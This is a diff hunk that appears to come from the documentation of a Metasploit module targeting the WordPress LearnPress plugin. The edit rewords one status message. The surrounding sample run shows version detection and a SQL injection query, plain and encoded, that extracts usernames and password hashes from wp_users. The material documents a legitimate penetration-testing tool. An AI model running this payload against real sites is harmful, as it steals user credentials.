@@ -60,7 +60,7 @@ count => 3
 resource (learnpress.rb)> run
 [*] Checking /wp-content/plugins/learnpress/readme.txt
 [*] Found version 3.2.6.7 in the plugin
-[+] Vulnerable version detected
+[+] Vulnerable version of LearnPress detected
 [*] Enumerating Usernames and Password Hashes
 [*] {SQLi} Executing (select group_concat(CKvFyxDg) from (select cast(concat_ws(';',ifnull(user_login,''),ifnull(user_pass,'')) as binary) CKvFyxDg from wp_users limit 3) wmnJO)
 [*] {SQLi} Encoded to (select group_concat(CKvFyxDg) from (select cast(concat_ws(0x3b,ifnull(user_login,repeat(0xd5,0)),ifnull(user_pass,repeat(0x49,0))) as binary) CKvFyxDg from wp_users limit 3) wmnJO)
